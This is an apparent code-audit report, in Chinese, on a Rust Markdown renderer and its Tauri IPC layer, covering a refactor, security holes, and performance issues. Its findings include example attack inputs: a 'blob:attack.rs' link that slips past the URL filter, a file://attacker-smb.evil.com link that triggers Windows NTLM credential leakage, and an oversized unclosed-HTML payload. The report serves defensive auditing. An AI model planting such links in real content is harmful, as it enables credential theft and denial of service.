# conex-markdown 2.0 渲染内核与安全体系审查报告

> **审查基准**：基于最近提交（BATCH-MD-PHASE0 至 PHASE7：commit `2dda1c561`, `6a2ee150d`, `9d8eadeab`, `65c2c4c90`, `609f49e27`, `bf3d60fa3`）的代码事实、架构拓扑与物理测试用例。  
> **文档位置**：`docs/markdown-rendering-analysis/audits/01-rust-kernel-and-security.md`  
> **审查范围**：
> - `crates/conex-markdown/src/` (核心解析、渲染子模块、代码高亮、URL 安全、缓存、Raw HTML 清洗)
> - `crates/conex-markdown/tests/` (单元与集成测试、覆盖率边界)
> - `apps/agent-workbench/src-tauri/src/markdown_commands.rs` (Tauri IPC 管道与对外命令接口)

---

## 一、审查综述与核心判定

在 BATCH-MD-PHASE1（commit `2dda1c561`）与 PHASE2（commit `9d8eadeab`）中，研发团队对 Markdown 渲染系统实施了自项目创立以来规模最大的一次底层重构：
1. **废黜千行巨石**：物理删除了长达 1639 行的单体 `crates/conex-markdown/src/renderer.rs`，按职责解耦为 9 个高内聚子模块（`renderer/` 目录），并引入双层 HTML 分流机制；
2. **能力全面解封**：在 `pulldown-cmark` 0.12 之上系统开启了 `ENABLE_TABLES`, `ENABLE_TASKLISTS`, `ENABLE_STRIKETHROUGH`, `ENABLE_FOOTNOTES`, `ENABLE_MATH`, `ENABLE_GFM`, `ENABLE_HEADING_ATTRIBUTES` 等全套工业级扩展；
3. **两端契约收口**：确立了以语义类名 `md-*` 为核心的单一真理源（SSOT）契约，实现了代码块逐行包裹与 CSS 计数器行号，解开了行号与纯文本复制的死结；
4. **架构收敛**：通过 commit `bf3d60fa3` 物理清退了前端近 1.4 万行拼凑冗余的旧 JS/TS Markdown 解析与清洗逻辑（`streamingDfaLexer.ts`, `markdownSanitizer.ts`, `StreamingGfmTable.tsx` 等），将 Markdown 渲染能力彻底下沉并统一至 Rust 内核。

### 核心结论
- **正面突破**：conex-markdown 2.0 的架构设计在模块化解耦、GFM 语法完整性、代码块行级模型、数学公式 Islands 隔离以及常规 Raw HTML 排版标签拯救方面，取得了突破实质性进展，彻底终结了此前“HTML 标签大屠杀”的极度粗暴设计。
- **严峻硬伤**：繁荣的表象之下潜伏着若干极为隐蔽且严重的**安全边界漏洞**与**状态机缺陷**：
  1. **协议逃逸（High/Security）**：`url_safety.rs` 的本地路径嗅探逻辑 `is_local_path_ref` 在放行代码扩展名时未排除 `blob:` 与未知自定义伪协议，且其校验顺序先于 `is_safe_href`，使得形如 `[link](blob:evil.rs)` 的恶意协议被错误包装为 `<button class="md-path-link">` 放行至特权宿主；
  2. **状态机吞噬 DoS（High/Availability）**：`raw_html.rs` 引入的跨事件深度捕获机制（Tag Balance Capture），在遭遇块级未闭合标签（如 `<details>` 或 `<div>`）时，会将后续整篇 Markdown 文档（包括标题、代码块、列表、表格）全部当作纯文本吞入缓冲区，并在文末 EOF 处遭 ammonia 扁平化，造成排版全面毁灭与内存膨胀；
  3. **验收虚标（Medium/Quality）**：虽然引入了 `two-face` 的 bat 语法包，但整个集成测试套件**仅对 TypeScript (`ts`) 进行了物理断言**，宣传的 Swift, Kotlin, Dart, TOML 等语言在测试中处于“零验收裸奔”状态；
  4. **IPC 传输拷贝瓶颈（Medium/Performance）**：Tauri IPC 管道完全基于普通 JSON 字符串传递，高频流式与批量渲染下经历多重转义膨胀与堆内存重复分配，缺乏二进制与增量流式通道。

---

## 二、改动效果深入评估（正面突破）

### 1. 模块化拆分与架构高内聚度
重构彻底打破了原 `renderer.rs` 将词法转换、HTML 拼接、代码高亮、URL 过滤与表格补偿杂糅在一起的混乱局面，建立了层次分明的子模块拓扑：

| 模块路径 | 代码行数 | 核心职责与设计亮点 |
| :--- | :---: | :--- |
| `src/renderer/mod.rs` | 527 行 | **主事件驱动与调度中心**：维护 Parser 驱动循环、全局 `heading_ids` 去重集合、`capture_stack` 标题/脚注分流栈；统筹 variant 选项（Chat/Document 软换行分流）。 |
| `src/renderer/blocks.rs` | 211 行 | **块级骨架控制**：处理段落、列表、任务项、引用与分割线。精确识别直接列表项，消除冗余 `<p>` 嵌套；任务列表采用就地回溯重写当前 `<li>`，确保 DOM 干净。 |
| `src/renderer/code.rs` | 360 行 | **专业代码块外壳**：解析 `file="..."` 面包屑与 `{1-3,5}` 行高亮范围；生成 `.md-code-line` 逐行容器；注入复制、软折行与折叠动作按钮；Mermaid 自动挂载 `data-md-island="mermaid"` 交互插槽。 |
| `src/renderer/math.rs` | 64 行 | **数学公式 Islands 隔离**：输出 `<span/div data-md-island="math" data-tex="...">`。DisplayMath 智能检测若在段落中则先行闭合 `<p>`，彻底杜绝 `<p><div>` 畸形嵌套。 |
| `src/renderer/footnotes.rs` | 110 行 | **两阶段脚注管线**：`FootnoteStore` 收集引用并维护 1-based 计数，定义块暂存进 capture 栈，文末生成语义化 `<section class="md-footnotes" role="doc-endnotes">`。 |
| `src/renderer/links.rs` | 214 行 | **多态链接流转**：外链强制 `target="_blank" rel="noreferrer"`，文件 URL 与本地代码路径转换为 `<button class="md-path-link">`，非安全链接降级为 `<span class="md-a-unsafe">`，远程图片降级为外链。 |
| `src/renderer/table.rs` | 378 行 | **GFM 表格稳健化**：为 `<table>` 注入 `--md-table-cols` 变量；短行自动按对齐规则填充 `<td>`；`prepare_tables` 预处理利用 Unicode 私有区占位符拯救代码跨度内的 `\|` 管道符。 |
| `src/renderer/text.rs` | 279 行 | **文本行内细粒度渲染**：实现 Chat 变体 `<br>` 与 Document 变体空格的软换行切换；管理 Raw HTML 跨事件捕获的事件路由与文本转义。 |
| `src/raw_html.rs` | 266 行 | **Raw HTML 白名单清洗底座**：基于 `ammonia` 构建只读全局清洗器，放行排版语义标签与属性；提供 `html_tag_delta` 跨事件净深度计算。 |

**架构评价**：这种拆分不仅让各子特性的代码行数均控制在 400 行以内，更重要的是建立了**“内核生成 HTML（可信）无需清洗”**与**“用户原始 HTML（不可信）走 ammonia 白名单清洗”**的双轨模型，从架构根基上消除了渲染器自身生成的标签被安全库误杀的风险。

---

### 2. GFM 扩展能力与排版语义输出质量

#### (1) GFM Alerts（Callout 提示框）
- **实现事实**：`pulldown-cmark` 的 `BlockQuoteKind` 捕获 `> [!NOTE]`, `> [!TIP]`, `> [!IMPORTANT]`, `> [!WARNING]`, `> [!CAUTION]`。
- **输出结构**：
  ```html
  <div class="md-callout md-callout-note">
    <div class="md-callout-title" data-callout-title="note"></div>
    <div class="md-callout-body"><p class="md-p">提示内容...</p></div>
  </div>
  ```
- **质量剖析**：标题文本与图标通过 `data-callout-title` 留白给 CSS 伪元素与 i18n 渲染，HTML 骨架极为轻量；普通 blockquote 保持 `<blockquote class="md-quote">`，互不干扰。

#### (2) 数学公式 Island（LaTeX / KaTeX）
- **实现事实**：开启 `Options::ENABLE_MATH`。行内公式 `$E=mc^2$` 与块级公式 `$$\int f(x)dx$$` 分别映射为：
  - 行内：`<span class="md-math md-math-inline" data-md-island="math" data-tex="E=mc^2">$E=mc^2$</span>`
  - 块级：`<div class="md-math md-math-block" data-md-island="math" data-tex="\int ...">$$\int ...$$</div>`
- **质量剖析**：Rust 内核彻底摈弃了在后端绑死重型 KaTeX/MathJax 编译器的历史包袱，转而交付“公式岛（Math Island）”交互契约。当块级公式发生在未闭合段落中时，`math.rs:26-44` 显式先闭合 `</p>`，输出 `<div>` 后再重开 `<p>`，保证了 DOM 树的语法绝对合法。

#### (3) 脚注体系（Footnotes）
- **实现事实**：通过 `FootnoteStore` 支持引用与定义分离。正文引用生成带有锚点的上标：
  ```html
  <sup class="md-footnote-ref" id="fnref-1"><a href="#fn-1">1</a></sup>
  ```
  文末生成有序列表与回跳链接（`↩`），且当同一脚注被多次引用时，自增生成 `fnref-1-2`，避免了 HTML 规范中 `id` 属性重复的校验违规。

#### (4) 任务列表（Task Lists）
- **实现事实**：`blocks.rs:143-162` 在捕获 `Event::TaskListMarker(checked)` 时，通过对当前正在构建的缓冲区进行逆向扫描（`rfind("<li")`），将普通列表项原地替换为 `<li class="md-li md-task-item">`，紧随其后输出 `<input type="checkbox" class="md-task-checkbox" disabled>`。
- **质量剖析**：全部输出为带有 `disabled` 属性的原生 checkbox，杜绝了用户在聊天/预览视图中误点击篡改状态，输出高度规范。

---

### 3. 代码高亮系统与交互解耦突破

#### (1) 行号与复制完全解耦
- **痛点根除**：旧架构中，前端复制按钮盲目读取 `pre.textContent`，导致如果渲染器输出了行号字符，用户复制出来的代码行行夹带序号。
- **2.0 解决方案**：Rust 后端在 `code.rs:218-227` 中，为每行代码包裹独立的行容器：
  ```html
  <span class="md-code-line" data-line="1">...</span>
  ```
  在 DOM 文本流中**不输出任何行号数字**；行号完全交由 CSS 伪元素 `::before { content: attr(data-line); }` 和 CSS Counter 产生。当用户全选或点击复制按钮时，剪贴板只拾取代码文本，彻底终结了历史死结。

#### (2) 跨行 span 闭合与重开平衡算法（`split_highlighted_html_lines`）
- **硬核算法**：`syntect` 的 `ClassedHTMLGenerator` 在输出 HTML 时，其生成的 `<span>` 标签经常跨越多行（例如多行字符串或块级注释）。如果直接按 `\n` 切分并套入 `.md-code-line`，会导致每行的 HTML 标签严重失衡破碎（如第一行只有开标签，最后一行只有闭标签）。
- **`highlight.rs:270-321`** 精巧地实现了一个微型 HTML 状态机：每当遭遇换行符 `\n` 时，强制将当前 `open_spans` 栈中的全部开标签逐一闭合（追加 `</span>`），压入当前行；然后在下一行开头，将 `open_spans` 中的所有开标签原样重新打开。测试用例 `highlight_lines_are_balanced_and_reopen_cross_line_spans` 严格验证了每一行的开闭标签数量 100% 平衡。

---

### 4. Raw HTML 跨事件捕获与 Selective Ammonia 清洗

#### (1) 拯救被误杀的排版标签
- 2.0 在 `raw_html.rs:27-32` 的白名单中，精确放行了日常 Markdown 撰写极度需要的排版标签：`<kbd>`, `<mark>`, `<details>`, `<summary>`, `<sub>`, `<sup>`, `<u>`, `<abbr>`, `<figcaption>`, `<figure>`, `<table>` 等；
- 剥离了所有具备可执行能力的标签（`<script>`, `<iframe>`, `<object>`, `<embed>`, `<form>`, `<button>`, `<input>` 等）；
- 属性过滤中仅保留 `colspan`, `rowspan`, `align`, `open`, `title` 等排版属性，全面剥离所有 `style`, `class`, `id` 及 `on*` 事件。

#### (2) 跨事件合并（Tag Balance Capture）
- 针对 `pulldown-cmark` 会把 `<kbd>Ctrl</kbd>` 拆分成 `InlineHtml("<kbd>")`、`Text("Ctrl")`、`InlineHtml("</kbd>")` 三个独立事件的特点，`raw_html.rs` 实现了 `html_tag_delta` 净深度追踪。
- 当且仅当净深度回落到 `<= 0` 时，才将合并后的整体片段交付 ammonia，成功使 `<kbd>Ctrl</kbd>` 原样存活，解决了逐事件清洗把内联文本挤到标签外的顽疾。

---

## 三、严重缺陷、隐患与安全漏洞深入挖掘（批判重点）

尽管 conex-markdown 2.0 带来了显著的结构优化，但通过深入代码审计，本系统仍然存在数个极具破坏性的安全与健壮性隐患：

---

### 1. 【安全漏洞/高危】协议过滤漏洞：`is_local_path_ref` 导致 `blob:` 与未知协议逃逸为路径按钮

#### 代码现场定位
`crates/conex-markdown/src/renderer/links.rs:19-36`:
```rust
// 1. 先尝试解析 file:///
if let Some(path) = file_url_to_path(&url) {
    self.start_path_button(&path);
    self.link_stack.push(LinkKind::PathLink);
    return;
}

// 2. 接着尝试判断是否为本地路径引用
if is_local_path_ref(&url) {
    let path = sanitize_url_candidate(&url);
    self.start_path_button(&path);
    self.link_stack.push(LinkKind::PathLink);
    return;
}

// 3. 最后才走 is_safe_href 安全检查
if !is_safe_href(&url) {
    self.push_str("<span class=\"md-a-unsafe\">");
    self.link_stack.push(LinkKind::Unsafe);
    return;
}
```

#### 漏洞成因分析
注意上述调用的严格先后顺序：**`is_local_path_ref(&url)` 发生在 `is_safe_href(&url)` 之前**。
现在穿透到 `crates/conex-markdown/src/url_safety.rs:317-354`：
```rust
pub fn is_local_path_ref(s: &str) -> bool {
    let variants = SmallUrlVariants::from_url(s);
    ...
    // 检查是否为危险 scheme
    for v in variants.iter() {
        if HTTP_SCHEME_RE.is_match(v) || MAILTO_SCHEME_RE.is_match(v) {
            return false;
        }
        if JS_VBSCRIPT_DATA_RE.is_match(v) {
            return false;
        }
    }
    if WIN_DRIVE_RE.is_match(t) { return true; }
    if t.starts_with('/') || t.starts_with("~/") || ... { return true; }
    if PROJECT_PREFIX_RE.is_match(t) { return true; }
    // 致命缺陷行：
    if CODE_EXT_RE.is_match(t) && !t.contains("://") {
        return true;
    }
    false
}
```
查看 `JS_VBSCRIPT_DATA_RE`（`url_safety.rs:36-38`）：
```rust
static JS_VBSCRIPT_DATA_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)^(javascript|vbscript|data):").expect("valid unsafe scheme regex")
});
```
**致命断裂面**：
1. `JS_VBSCRIPT_DATA_RE` **仅排除了 `javascript:`, `vbscript:`, `data:` 三种协议**！它没有使用全局协议正则 `ANY_SCHEME_RE`，**完全漏掉了 `blob:` 协议**以及诸如 `vscode:`, `file-custom:`, `ms-appx:` 等各类自定义 URL scheme！
2. 只要一个 `blob:` 协议链接不包含 `://`（规范的 blob URL 格式如 `blob:d39589d3-a006-4767-9c94-0a37943440e2`，或者伪造的 `blob:payload.rs` / `blob:evil.py` / `blob:shell.ts`），它满足：
   - 不匹配 `HTTP_SCHEME_RE` / `MAILTO_SCHEME_RE`；
   - 不匹配 `JS_VBSCRIPT_DATA_RE`；
   - 不包含 `://`；
   - 以后缀 `.rs` / `.py` / `.ts` 结尾，直接命中 `CODE_EXT_RE`！
3. **攻击触发**：
   输入 Markdown：`[Exploit](blob:attack.rs)`
   - `is_local_path_ref("blob:attack.rs")` 荒谬地返回 **`true`**！
   - `renderer/links.rs` 提前返回，直接输出：
     ```html
     <button type="button" class="md-path-link" data-path="blob:attack.rs">Exploit</button>
     ```
   - 本应被 `is_safe_href` 拦截并降级为 `<span class="md-a-unsafe">` 的非安全协议，被成功伪装为受信任的“本地路径按钮”，注入到了宿主交互树中！

---

### 2. 【高危/DoS与排版毁灭】Raw HTML 跨事件捕获的状态机死锁与内容吞噬

#### 代码现场定位
`crates/conex-markdown/src/renderer/text.rs:71-145`:
```rust
pub(super) fn handle_raw_html(&mut self, html: &str, block: bool) {
    let depth = raw_html::html_tag_delta(html);
    if depth > 0 {
        self.raw_html = Some(RawHtmlCapture {
            buffer: html.to_string(),
            depth,
            block,
        });
        return;
    }
    ...
}

pub(super) fn capture_raw_html_event(&mut self, event: &Event<'_>) -> bool {
    let Some(capture) = self.raw_html.as_ref() else {
        return false;
    };
    let inline_capture = !capture.block;

    match event {
        Event::Html(html) | Event::InlineHtml(html) => { self.append_raw_html(html); }
        Event::Text(text) => { self.append_raw_text(&escape_html(text)); }
        Event::Code(code) => { ... }
        Event::SoftBreak | Event::HardBreak => { self.append_raw_text("\n"); }
        ...
        Event::End(end)
            if inline_capture
                && matches!(end, TagEnd::Paragraph | TagEnd::Heading(_) | ...) =>
        {
            self.finish_raw_html_capture();
        }
        _ => {}
    }
    true // 致命：返回 true 表示当前事件已被捕获消费！
}
```

#### 严重缺陷深度剖析

##### (1) 块级未闭合标签吞噬后续全篇 Markdown（Content Swallowing）
- 观察 `inline_capture`：当用户或模型输出一个块级 HTML 标签（如 `<details>` 或 `<div>`）时，`block` 为 `true`，此时 `inline_capture = false`！
- 此时保护性分支 `Event::End(end) if inline_capture && matches!(...)` **永久失效**！
- 只要后续没有出现相平衡的闭合标签 `</div>` 或 `</details>`，`capture_raw_html_event` 将无条件返回 `true`，并将后续**所有**事件拦截：
  - 所有的 `Event::Start(Tag::Heading)`、`Tag::CodeBlock`、`Tag::Table`、`Tag::List` 在 match 中全部落入 `_ => {}`，被静默**丢弃**！
  - 所有的 `Event::Text` 全部被转义后单纯追加进 `capture.buffer`！
- 直到整个 Markdown 文档到达 EOF，在 `renderer/mod.rs:171` 执行 `self.finish_raw_html_capture()`：
  将整个几万字符的 `capture.buffer` 作为一个巨型 HTML 字符串送入 ammonia 清洗。
- **后果**：
  原本精心编写的大纲标题、语法高亮代码块、交互表格全部被降维抹杀，变成了一整坨混杂在 `<details>` 里的未格式化散落文本。模型输出流式被打断或者偶尔遗漏一个闭合标签，将导致整页消息瞬间“视觉崩塌”。

##### (2) 自研 `html_tag_delta` 扫描器与 `html5ever` 的规范遵从度偏差
- `raw_html.rs:83-184` 手写了一个简易的字符扫描器来计算标签深度 `depth`，而 ammonia 底层使用的是严格遵循 W3C HTML5 规范的 `html5ever`。两者对 HTML 语法的理解存在根本性偏差：
  1. **自闭合语法偏差**：
     在 `html_tag_delta` 中，`bytes.get(end - 1) == Some(b'/')` 就被认定为 `self_closing`，因此 `<div />` 会计算为 `depth += 0`。
     但在 HTML5 规范中，`div` 绝对不是 void 元素，`<div />` 末尾的斜杠直接被规范忽略，浏览器和 `html5ever` 均将其解析为**合法的未闭合开标签 `<div>`**！
     这直接导致 `html_tag_delta` 认为深度平衡不用捕获，而进入 ammonia 后由于缺少闭标签被自动补全或结构错位；
  2. **未知自定义标签的误捕获**：
     如果文本中包含诸如 `<Widget:Button foo="bar">` 或 `<CustomCard>` 等标记，`html_tag_delta` 会盲目认为这是一个合法的开标签，致使 `depth` 变为 1，从而进入捕获状态吞噬后文。但 ammonia 清洗时根本不认识这个标签，会直接将其剥除。

##### (3) 无容量熔断与内存放大（ReDoS / Buffer Exhaustion）
- `RawHtmlCapture` 内部的 `buffer: String` **没有任何长度上限截断**。
- 如果恶意构造一个以 `<details>` 开头的 5MB Markdown Payload，它将在内存中经历：
  `String` 持续动态扩容 $\to$ 每行文本 `escape_html` 产生中间字符串并拷贝 $\to$ 拼接进 5MB buffer $\to$ `ammonia.clean()` 在内存中构建巨大的 DOM 树 $\to$ 序列化输出。
- 在流式输出模式下，如果每一帧都送入这一段未闭合的 5MB 文本，后端将在主线程或 Tokio blocking 线程中发生极其剧烈的 CPU 尖峰与频繁 GC/内存拷贝，直接造成桌面端卡死。

---

### 3. 【网络/安全边界】UNC 路径 NTLM 凭据反射泄漏风险

在 `crates/conex-markdown/src/url_safety.rs:270-309` 的 `file_url_to_path` 实现中：
```rust
let path = if is_authority_form {
    if let Some(after_slash) = decoded.strip_prefix('/') {
        ...
    } else {
        // file://server/share：UNC / 网络路径
        if cfg!(windows) {
            format!("\\\\{}", decoded.replace('/', "\\"))
        } else {
            format!("//{decoded}")
        }
    }
} else { decoded };
```
- **Windows 攻击链路**：
  攻击者诱导用户点击或在文档中嵌入：`[Download Report](file://attacker-smb.evil.com/share/report.pdf)`。
- 内核将其转换为 Windows UNC 路径：`\\attacker-smb.evil.com\share\report.pdf`，并包装为：
  ```html
  <button class="md-path-link" data-path="\\attacker-smb.evil.com\share\report.pdf">Download Report</button>
  ```
- 当前端响应点击并调用 `apps/agent-workbench/src-tauri/src/host_openers/execute.rs:467`：
  ```rust
  let p = PathBuf::from(&target);
  if !p.exists() { ... }
  ```
- 在 Windows 操作系统底层，**任何对远程 UNC 路径的文件存在性检查（`PathFileExistsW` 或 Rust `Path::exists`）均会触发操作系统向目标服务器 445 端口发起 SMB 认证协商**，并自动附带当前 Windows 登录用户的 NetNTLMv2 凭据哈希（NTLM reflection / coercion attack）！
- `url_safety.rs` 完全未对 UNC 主机名做任何内网或本地环回限制，直接放行了远程 SMB 路径的生成。

---

### 4. 【语法高亮/虚假繁荣】现代语言包未真实验收与别名缺失

在 `Cargo.toml` 中，项目将 `two-face` 配置为：
```toml
two-face = { version = "0.5", default-features = false, features = ["syntect-fancy"] }
```
宣传称已全面支持 TypeScript, Swift, Kotlin, Dart, TOML，但审计事实显示：

1. **集成测试严重失职（单语言冒充全量）**：
   检索 `crates/conex-markdown/tests/integration.rs`：
   ```rust
   // 整个测试文件第 428 行：
   #[test]
   fn highlight_typescript_has_classed_spans() {
       setup();
       let lines = highlight_code_lines("const x = 1;", Some("ts"));
       assert!(lines[0].contains("<span class=\""));
   }
   ```
   **全仓 49 个集成测试中，有且仅有这一条针对 `ts` 的测试用例！**
   Swift, Kotlin, Dart, TOML 没有哪怕一条单元测试或集成测试对其代码块的高亮有效性、行切分平衡性以及 CSS 类名产出进行过物理断言！
2. **语言别名映射严重遗漏**：
   在 `crates/conex-markdown/src/highlight.rs:161-178` 的 `normalize_lang` 中：
   - 映射了 `"kt" => "kotlin"`, `"ts" | "tsx" => "typescript"`, `"py" => "python"` 等；
   - **完全没有**包含 Swift、Dart、TOML 的常见别名（例如没有处理用户常写的语言标识），只能听任其落入 `other` 兜底；
3. **`syntect-fancy` 的天然隐患**：
   `two-face` 官方文档明确告警：为了适配纯 Rust 的 `fancy-regex` 引擎以避免 C 依赖，部分复杂的语法定义（Sublime 语法包中的向前查找、回溯等高级正则）在 fancy 模式下是被**裁剪或剔除**的。在缺乏真实代码片段回归测试的情况下，Swift 或 Kotlin 的特定语法（如尾随闭包、协程标记）极易引发 `render_lines_with_syntect` 内部报错，并被代码中的 `.unwrap_or_else(|_| escape_lines(raw))` 静默吞噬，降级为毫无颜色的白字纯文本，而 CI 门禁对此毫不知情。

---

### 5. 【性能与流式】Stream 模式伪避免开销与全量重新解析瓶颈

1. **流式开销未真正根除**：
   `render_markdown_stream`（`renderer/mod.rs:393`）将 `stream_mode` 设为 `true`，使得在代码块渲染时走 `escape_lines(body)`，避免了 `syntect` 高亮。
   **然而**：
   - `prepare_tables(text)` 依然会在每次 token 追加时全量触发；
   - `pulldown_cmark::Parser::new_ext` 依然会从第 0 个字节开始，对数万字符的完整消息做全量 CommonMark 语法树解析与 Token 流构建；
   - 标题去重集 `heading_ids`、脚注存储 `FootnoteStore` 每次从头分配；
   - 这意味着随着大模型输出不断变长，整个处理链路的时间复杂度是 $\mathcal{O}(N^2)$。当一个长回答达到数千字时，前端每收到 1 个 Token，后端都要经历一次几万字节的全量 AST 重新编译与字符串重组。
2. **LRU 缓存粒度单一**：
   `cache.rs` 的 Key 是整段 Markdown 源码的 `String`。
   在流式生成期间，每一次文本变动都导致 Key 不一致，流式期间缓存命中率为 **0%**；
   而在长文档渲染时，如果仅仅是文末发生了一个字符的编辑，整个几百 KB 的长文档缓存全部穿透，无法实现块级（Block-level）的局部缓存复用。

---

### 6. 【Tauri IPC 管道】序列化双重膨胀与内存拷贝阻断

在 `apps/agent-workbench/src-tauri/src/markdown_commands.rs:47-91` 中：
```rust
#[tauri::command(rename = "core_md_render")]
pub async fn md_render(text: String, variant: String) -> Result<RenderResultDto, CoreError> {
    let options = parse_options(&variant)?;
    tokio::task::spawn_blocking(move || {
        RenderResultDto::from(conex_markdown::render_markdown(&text, options))
    })
    .await
    ...
}
```
1. **传输链路全流程堆分配沉重**：
   - 前端 V8 堆内存中的 `text` $\to$ `JSON.stringify` 序列化为 UTF-16 字符串；
   - 通过 WebView2 IPC 管道转码为 UTF-8 字节流并拷贝到 Rust 进程；
   - Tauri 使用 `serde_json::from_str` 在 Rust 堆上重新分配 `String`；
   - 转移给 Tokio blocking 线程池，内核拼接出庞大的 `html: String`；
   - Tauri 框架再次将 `RenderResultDto` 序列化为 JSON 字符串。**在此阶段，HTML 中成千上万个双引号 `"` 和换行符 `\n` 全部被强制转义为 `\"` 和 `\n`，导致跨进程数据包体积膨胀 30%~50%**；
   - 再次经过 IPC 管道送入 V8，V8 调用 `JSON.parse` 解析并在 JS 堆上构建字符串对象。
2. **高频流式下的消息泵拥塞**：
   如果流式渲染未在前端做极其严格的防抖节流（如 50ms 一帧），而是任由 LLM Token 回调高频触发（30~60 次/秒），每一次调用都对应着一次上述跨进程 JSON 转义大对象的全量往返。这不仅使得 WebView2 的 IPC 消息队列剧烈排队，而且会在 V8 堆中产生极其剧烈的新生代垃圾回收（GC Thrashing），导致 UI 界面丢帧、打字机动画掉帧。

---

## 四、问题严重度与整改建议矩阵

基于上述审计结论，提出以下关键整改措施与技术加固路线图：

| 编号 | 缺陷问题分类 | 严重级别 | 影响面 | 代码级整改建议（Actionable Fix） |
| :---: | :--- | :---: | :--- | :--- |
| **SEC-01** | `is_local_path_ref` 协议过滤缺失导致 `blob:` 逃逸 | **High (安全)** | 链接与路径按钮 | 在 `url_safety.rs` 的 `is_local_path_ref` 中，**禁止仅排除三种危险协议**；必须改为使用 `ANY_SCHEME_RE` 统一检测，凡是包含合法 Scheme 前缀且非 `file:` 的 URL，一律严禁归入本地路径引用；将 `is_safe_href` 检查前置。 |
| **SEC-02** | UNC 路径触发 Windows NTLM 凭据反射嗅探 | **High (安全)** | Windows 宿主安全 | 在 `url_safety.rs:file_url_to_path` 中，严禁无条件放行 `\\server\share` 形式的远程 UNC 路径；或者在 Tauri 宿主打开层 `open_path_with_default_app` 中，增加针对 UNC 路径的明确拦截校验，拒绝任何非本地驱动器（`C:` 等）的远程共享请求。 |
| **ROB-01** | Raw HTML 跨事件捕获在块级未闭合时吞噬后续 Markdown | **High (可用性)** | 流式排版渲染 | 在 `renderer/text.rs:capture_raw_html_event` 中：<br>1. 为 `RawHtmlCapture` 增加单次捕获最大字节数限制（如 32KB），超限强制执行 `finish_raw_html_capture` 熔断；<br>2. 移除 `inline_capture` 对块级事件的盲目放行，当遇到下一个块级开标签（如标题、水平线、另一个 blockquote）时，强制截断并结算当前 Raw HTML。 |
| **ROB-02** | 自研 `html_tag_delta` 扫描与 HTML5 规范脱节 | **Medium (稳健性)** | 标签平衡识别 | 在 `raw_html.rs` 中修正 Void 标签与自闭合标签的判定逻辑，对 `<div />`、`<p>` 等非标准自闭合行为对齐 HTML5 规范；或者直接引入极轻量的词法分词器，而非朴素的字节比对。 |
| **TST-01** | Swift, Kotlin, Dart, TOML 高亮缺乏物理验收测试 | **Medium (质量)** | 语法高亮覆盖 | 在 `crates/conex-markdown/tests/integration.rs` 中，**补齐针对 Swift, Kotlin, Dart, TOML 的端到端高亮测试**，断言生成的 HTML 包含有效的 `md-code-line` 与 `syntect` class span；在 `normalize_lang` 中补全别名。 |
| **PERF-01**| 流式逐 Token 全量重新编译与 IPC 传输拷贝开销 | **Medium (性能)** | 对话流响应性能 | 1. 推进前端真增量分块调度，流式只将尾部活跃的单个 Block 文本送入 Rust 流式接口，历史 Sealed Block 完全锁死，避免整篇长文重算；<br>2. 探索在 Tauri 命令层中利用纯二进制字节切片传输大 HTML，绕过 JSON 转义序列化开销。 |

---

## 五、最终审计结论

`conex-markdown 2.0` 的重构方向是完全正确且成效显著的，成功建立了现代 Markdown 渲染引擎的核心骨架，清退了庞大的技术债务。但当前交付的代码在**协议边界防护、未闭合 Raw HTML 状态机容错、UNC 凭据外泄防范以及语法高亮测试完备性**上，依然留有不可忽视的软肋与漏洞。上述问题必须在下一阶段的加固冲刺中彻底闭环根治，以确保渲染内核达到工业级的高可用与高安全标准。
